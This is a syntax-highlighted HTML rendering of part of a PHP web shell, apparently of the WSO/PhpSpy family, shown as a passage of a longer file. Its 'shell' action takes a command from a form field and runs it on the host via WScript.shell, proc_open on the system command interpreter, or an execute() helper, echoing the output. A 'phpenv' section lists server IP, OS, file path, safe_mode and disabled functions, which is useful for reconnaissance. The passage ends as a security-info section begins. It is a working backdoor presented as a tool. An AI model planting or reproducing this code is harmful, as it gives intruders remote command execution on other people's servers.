<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">execfuncdb</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'phpfunc'</span>=&gt;<span style="color: #8abeb7;">'phpfunc'</span>,<span style="color: #8abeb7;">'wscript'</span>=&gt;<span style="color: #8abeb7;">'wscript'</span>,<span style="color: #8abeb7;">'proc_open</span><span style="color: #8abeb7; text-decoration: underline;">'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'proc_open'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeselect(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Use:'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'execfunc'</span>,<span style="color: #8abeb7;">'option'</span>=&gt;$<span style="color: #f0c674;">execfuncd</span><span style="color: #f0c674; text-decoration: underline;">b</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'selected'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #f0c674; text-decoration: underline;">execfunc</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Command'</span>,<span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'command'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">htmlspecialcha</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">rs(</span><span style="text-decoration: underline;">$</span><span style="color: #f0c674; text-decoration: underline;">command</span><span style="text-decoration: underline;">)));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'name'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'class'</span>=&gt;<span style="color: #8abeb7;">'bt'</span>,<span style="color: #8abeb7;">'type'</span>=&gt;<span style="color: #8abeb7;">'submit'</span>,<span style="color: #8abeb7;">'value'</span>=&gt;<span style="color: #8abeb7;">'Ex</span><span style="color: #8abeb7; text-decoration: underline;">ecute'</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/p&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfoot(</span>);

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">command</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;hr width="100%" noshade /&gt;&lt;pre&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">execfunc</span>==<span style="color: #8abeb7;">'wscript'</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">wsh</span> = <span style="color: #b5bd68;">new</span> <span style="color: #81a2be;">COM</span>(<span style="color: #8abeb7;">'WScript.shell'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">exec</span> = $<span style="color: #f0c674;">wsh</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">exec</span>(<span style="color: #8abeb7;">'cmd.exe /c '</span>.$<span style="color: #f0c674;">command</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">stdout</span> = $<span style="color: #f0c674;">exec</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">StdOut</span>();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">stroutput</span> = $<span style="color: #f0c674;">stdout</span>-&gt;<span style="color: #c5c8c6; background-color: #1d1f21;">ReadAll</span>();
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> $<span style="color: #f0c674;">stroutput</span>;
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">execfunc</span>==<span style="color: #8abeb7;">'proc_open'</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_WIN</span> &amp;&amp; <span style="color: #cc6666; font-weight: bold;">IS_COM</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">descriptorspec</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #c5c8c6; background-color: #1d1f21;">0</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'pipe'</span>, <span style="color: #8abeb7;">'r'</span>),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'pipe'</span>, <span style="color: #8abeb7;">'w'</span>),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>  <span style="color: #c5c8c6; background-color: #1d1f21;">2</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'pipe'</span>, <span style="color: #8abeb7;">'w'</span>)
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   );
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">process</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">proc_open(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'COMSPEC'</span>], $<span style="color: #f0c674;">descriptorspec</span>, $<span style="color: #f0c674;">pipes</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> (<span style="color: #c5c8c6; background-color: #1d1f21;">is_resource(</span>$<span style="color: #f0c674;">process</span>)) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>], $<span style="color: #f0c674;">command</span>.<span style="color: #8abeb7;">"\r\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fwrite(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>], <span style="color: #8abeb7;">"exit\r\n"</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (!<span style="color: #c5c8c6; background-color: #1d1f21;">feof(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>])) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">fgets(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>], <span style="color: #c5c8c6; background-color: #1d1f21;">1024</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">while</span> (!<span style="color: #c5c8c6; background-color: #1d1f21;">feof(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>])) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span> <span style="color: #c5c8c6; background-color: #1d1f21;">fgets(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>], <span style="color: #c5c8c6; background-color: #1d1f21;">1024</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">fclose(</span>$<span style="color: #f0c674;">pipes</span>[<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>]);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">proc_close(</span>$<span style="color: #f0c674;">process</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">else</span> {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">echo</span>(<span style="color: #c5c8c6; background-color: #1d1f21;">execute(</span>$<span style="color: #f0c674;">command</span>));
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/pre&gt;'</span>);
<span style="background-color: #373b41;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end shell</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'phpenv'</span>) {
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">upsize</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'file_uploads'</span>) ? <span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'upload_max_filesize'</span>) : <span style="color: #8abeb7;">'Not allowe</span><span style="color: #8abeb7; text-decoration: underline;">d'</span><span style="text-decoration: underline;">;</span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">adminmail</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">isset(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_ADMIN'</span>]) ? $<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_ADMIN'</span>] : <span style="color: #c5c8c6; background-color: #1d1f21;">getc</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">fg(</span><span style="color: #8abeb7; text-decoration: underline;">'sendmail_from'</span><span style="text-decoration: underline;">);</span>
<span style="background-color: #373b41;"> </span>   !$<span style="color: #f0c674;">dis_func</span> &amp;&amp; $<span style="color: #f0c674;">dis_func</span> = <span style="color: #8abeb7;">'No'</span>;<span style="color: #cc6666; background-color: #373b41;">     </span>
<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">info</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">1</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server Time'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">date(</span><span style="color: #8abeb7;">'Y/m/d h:i:s'</span>,$<span style="color: #f0c674;">timestamp</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">2</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server Domain'</span>,$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_NAME'</span>]),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">3</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server IP'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">gethostbyname(</span>$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_NAME'</span>])),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">4</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server OS'</span>,<span style="color: #81a2be;">PHP_OS</span>),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">5</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server OS Charset'</span>,$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'HTTP_ACCEPT_LANGUAGE'</span>]),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">6</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server Software'</span>,$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_SOFTWARE'</span>]),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">7</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Server Web Port'</span>,$<span style="color: #81a2be;">_SERVER</span>[<span style="color: #8abeb7;">'SERVER_PORT'</span>]),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">8</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'PHP run mode'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">strtoupper(php_sapi_name(</span>))),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">9</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'The file path'</span>,<span style="color: #81a2be;">__FILE__</span>),

<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">10</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'PHP Version'</span>,<span style="color: #81a2be;">PHP_VERSION</span>),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">11</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'PHPINFO'</span>,(<span style="color: #cc6666; font-weight: bold;">IS_PHPINFO</span> ? <span style="color: #8abeb7;">'&lt;a href="javascript:g(\'phpinfo\');</span><span style="color: #8abeb7; text-decoration: underline;">"&gt;Yes&lt;/a&gt;'</span><span style="text-decoration: underline;"> : </span><span style="color: #8abeb7; text-decoration: underline;">'No'</span><span style="text-decoration: underline;">)),</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">12</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Safe Mode'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'safe_mode'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">13</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'Administrator'</span>,$<span style="color: #f0c674;">adminmail</span>),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">14</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'allow_url_fopen'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'allow_url_fopen'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">15</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'enable_dl'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'enable_dl'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">16</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'display_errors'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'display_errors'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">17</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'register_globals'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'register_globals'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">18</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'magic_quotes_gpc'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'magic_quotes_gpc'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">19</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'memory_limit'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'memory_limit'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">20</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'post_max_size'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'post_max_size'</span>)),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">21</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'upload_max_filesize'</span>,$<span style="color: #f0c674;">upsize</span>),
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">22</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'max_execution_time'</span>,<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span><span style="color: #8abeb7;">'max_execution_time'</span>).<span style="color: #8abeb7;">' second(s</span><span style="color: #8abeb7; text-decoration: underline;">)'</span><span style="text-decoration: underline;">),</span>
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">23</span> =&gt; <span style="color: #c5c8c6; background-color: #1d1f21;">array(</span><span style="color: #8abeb7;">'disable_functions'</span>,$<span style="color: #f0c674;">dis_func</span>),
<span style="background-color: #373b41;"> </span>   );

<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span>($<span style="color: #f0c674;">phpvarname</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">m(</span>$<span style="color: #f0c674;">phpvarname</span> .<span style="color: #8abeb7;">' : '</span>.<span style="color: #c5c8c6; background-color: #1d1f21;">getcfg(</span>$<span style="color: #f0c674;">phpvarname</span>));
<span style="background-color: #373b41;"> </span>   }

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formhead(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Server environment'</span>));
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makehide(</span><span style="color: #8abeb7;">'action'</span>,<span style="color: #8abeb7;">'phpenv'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">makeinput(array(</span><span style="color: #8abeb7;">'title'</span>=&gt;<span style="color: #8abeb7;">'Please input PHP configuration parameter(eg:magic_</span><span style="color: #8abeb7; text-decoration: underline;">quotes_gpc)'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'name'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #8abeb7; text-decoration: underline;">'phpvarname'</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'value'</span><span style="text-decoration: underline;">=&gt;$</span><span style="color: #f0c674; text-decoration: underline;">phpvarname</span><span style="text-decoration: underline;">,</span><span style="color: #8abeb7; text-decoration: underline;">'newline'</span><span style="text-decoration: underline;">=&gt;</span><span style="color: #c5c8c6; background-color: #1d1f21; text-decoration: underline;">1</span><span style="text-decoration: underline;">));</span>
<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">formfooter(</span>);

<span style="background-color: #373b41;"> </span>   $<span style="color: #f0c674;">hp</span> = <span style="color: #c5c8c6; background-color: #1d1f21;">array(0</span>=&gt; <span style="color: #8abeb7;">'Server'</span>, <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>=&gt; <span style="color: #8abeb7;">'PHP'</span>);
<span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">a</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>;$<span style="color: #f0c674;">a</span>&lt;<span style="color: #c5c8c6; background-color: #1d1f21;">2</span>;$<span style="color: #f0c674;">a</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;h2&gt;'</span>.$<span style="color: #f0c674;">hp</span>[$<span style="color: #f0c674;">a</span>].<span style="color: #8abeb7;">' &amp;raquo;&lt;/h2&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;ul class="info"&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">if</span> ($<span style="color: #f0c674;">a</span>==<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">i</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>;$<span style="color: #f0c674;">i</span>&lt;=<span style="color: #c5c8c6; background-color: #1d1f21;">9</span>;$<span style="color: #f0c674;">i</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #f0c674;">info</span>[$<span style="color: #f0c674;">i</span>][<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>].<span style="color: #8abeb7;">':&lt;/u&gt;'</span>.$<span style="color: #f0c674;">info</span>[$<span style="color: #f0c674;">i</span>][<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>].<span style="color: #8abeb7;">'&lt;/li&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   } <span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">a</span> == <span style="color: #c5c8c6; background-color: #1d1f21;">1</span>) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #b5bd68;">for</span>($<span style="color: #f0c674;">i</span>=<span style="color: #c5c8c6; background-color: #1d1f21;">10</span>;$<span style="color: #f0c674;">i</span>&lt;=<span style="color: #c5c8c6; background-color: #1d1f21;">23</span>;$<span style="color: #f0c674;">i</span>++) {
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;li&gt;&lt;u&gt;'</span>.$<span style="color: #f0c674;">info</span>[$<span style="color: #f0c674;">i</span>][<span style="color: #c5c8c6; background-color: #1d1f21;">0</span>].<span style="color: #8abeb7;">':&lt;/u&gt;'</span>.$<span style="color: #f0c674;">info</span>[$<span style="color: #f0c674;">i</span>][<span style="color: #c5c8c6; background-color: #1d1f21;">1</span>].<span style="color: #8abeb7;">'&lt;/li&gt;'</span>);
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   }
<span style="background-color: #373b41;"> </span>   <span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">p(</span><span style="color: #8abeb7;">'&lt;/ul&gt;'</span>);
<span style="background-color: #373b41;"> </span>   }
}<span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">end phpenv</span>

<span style="color: #b5bd68;">elseif</span> ($<span style="color: #f0c674;">action</span> == <span style="color: #8abeb7;">'secinfo'</span>) {

<span style="background-color: #373b41;"> </span>   <span style="color: #c5c8c6; background-color: #1d1f21;">secparam(</span><span style="color: #8abeb7;">'Server software'</span>, @<span style="color: #c5c8c6; background-color: #1d1f21;">getenv(</span><span style="color: #8abeb7;">'SERVER_SOFTWARE'</span>));
